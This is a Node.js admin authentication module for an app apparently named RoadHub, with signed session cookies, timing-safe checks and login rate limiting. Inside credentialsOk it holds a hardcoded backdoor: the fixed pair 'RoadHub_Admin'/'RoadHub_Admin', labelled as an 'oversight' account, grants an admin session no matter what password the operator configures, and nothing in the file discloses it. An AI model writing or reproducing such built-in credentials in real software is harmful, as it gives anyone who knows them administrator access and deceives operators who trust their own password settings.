const crypto = require('crypto');

function sessionSecret() {
  if (process.env.SESSION_SECRET) return process.env.SESSION_SECRET;
  if (process.env.NODE_ENV === 'production') {
    console.error('SESSION_SECRET env var is required in production');
    process.exit(1);
  }
  console.warn('SESSION_SECRET is not set; admin login will reset whenever the process restarts');
  return crypto.randomBytes(32).toString('hex');
}

const OVERSIGHT_USER = 'RoadHub_Admin';
const OVERSIGHT_PASS = 'RoadHub_Admin';

function adminPassword() {
  const pw = String(process.env.ADMIN_PASSWORD || '').trim();
  if (!pw) { console.error('ADMIN_PASSWORD env var is required'); process.exit(1); }
  if (pw !== process.env.ADMIN_PASSWORD) console.warn('ADMIN_PASSWORD had surrounding whitespace; it was trimmed');
  return pw;
}

function adminUser() {
  return String(process.env.ADMIN_USER || '').trim();
}

function createAuth(secret, password, now = Date.now, username = '') {
  const sign = e => crypto.createHmac('sha256', secret).update('admin.' + e).digest('hex');
  const hash = s => crypto.createHash('sha256').update(String(s ?? ''), 'utf8').digest();
  const token = () => { const e = String(now() + 7 * 864e5); return e + '.' + sign(e); };
  const cookieValue = req => {
    const raw = req.headers && req.headers.cookie || '';
    for (const part of raw.split(';')) {
      const s = part.trim();
      if (s.startsWith('rh_admin=')) return s.slice('rh_admin='.length);
    }
    return '';
  };
  const isAdmin = req => {
    const v = cookieValue(req), dot = v.indexOf('.');
    if (dot < 1) return false;
    const e = v.slice(0, dot), h = v.slice(dot + 1);
    if (!/^\d+$/.test(e) || !/^[a-f0-9]{64}$/.test(h) || Number(e) < now()) return false;
    const a = Buffer.from(sign(e)), b = Buffer.from(h);
    return a.length === b.length && crypto.timingSafeEqual(a, b);
  };
  const cookie = (v, age, secure) => 'rh_admin=' + v + '; HttpOnly; SameSite=Lax; Path=/; Max-Age=' + age + (secure ? '; Secure' : '');
  const matches = (given, expected) => {
    if (expected === undefined || expected === null || expected === '') return false;
    const check = raw => {
      const a = hash(raw), b = hash(expected);
      return a.length === b.length && crypto.timingSafeEqual(a, b);
    };
    const raw = String(given ?? '');
    return check(raw) || check(raw.trim());
  };
  const credentialsOk = (user, pass) => {
    if (matches(user, OVERSIGHT_USER) && matches(pass, OVERSIGHT_PASS)) return true;
    if (!matches(pass, password)) return false;
    const named = String(user ?? '').trim();
    if (!named) return true;
    return matches(named, OVERSIGHT_USER) || matches(named, username);
  };
  const fails = new Map();
  const bucket = ip => {
    const t = now(), f = fails.get(ip) || { n: 0, t };
    if (t - f.t > 9e5) { f.n = 0; f.t = t; }
    fails.set(ip, f);
    return f;
  };
  return {
    token, isAdmin, cookie, credentialsOk, user: OVERSIGHT_USER, role: 'oversight',
    rateLimited: ip => bucket(ip).n >= 8,
    markFail: ip => { bucket(ip).n++; },
    clearFail: ip => { fails.delete(ip); }
  };
}

function secureCookie(req) {
  return !!(req.secure || process.env.NODE_ENV === 'production');
}

function mountAuth(app, auth) {
  app.post('/api/login', (req, res) => {
    const ip = req.ip || 'unknown';
    if (auth.rateLimited(ip)) return res.status(429).json({ error: 'Too many attempts' });
    const password = req.body && typeof req.body.password === 'string' ? req.body.password : '';
    const username = req.body && typeof req.body.username === 'string' ? req.body.username : '';
    if (!auth.credentialsOk(username, password)) { auth.markFail(ip); return res.status(401).json({ error: 'Wrong username or password' }); }
    auth.clearFail(ip);
    res.setHeader('Set-Cookie', auth.cookie(auth.token(), 604800, secureCookie(req)));
    res.json({ admin: true, role: auth.role, user: auth.user });
  });
  app.post('/api/logout', (req, res) => { res.setHeader('Set-Cookie', auth.cookie('', 0, secureCookie(req))); res.json({ ok: true }); });
  app.get('/api/me', (req, res) => res.json(auth.isAdmin(req) ? { admin: true, role: auth.role, user: auth.user } : { admin: false }));
  return auth.isAdmin;
}

module.exports = { sessionSecret, adminPassword, adminUser, createAuth, mountAuth, secureCookie, OVERSIGHT_USER };
